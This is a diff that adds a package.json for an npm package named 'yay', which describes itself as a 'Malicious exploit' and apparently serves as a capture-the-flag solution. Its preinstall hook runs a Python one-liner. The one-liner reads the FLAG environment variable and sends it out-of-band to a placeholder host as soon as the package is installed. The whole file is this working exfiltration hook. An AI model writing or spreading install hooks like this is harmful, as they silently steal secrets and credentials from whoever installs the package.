@@ -1,0 +1,12 @@
+{
+  "name": "yay",
+  "version": "1.0.0",
+  "description": "Malicious exploit",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "python -c \"import os; from urllib.request import urlopen; urlopen('OOB/'+os.environ['FLAG'])\""
+  },
+  "author": "Me",
+  "license": "ISC"
+}
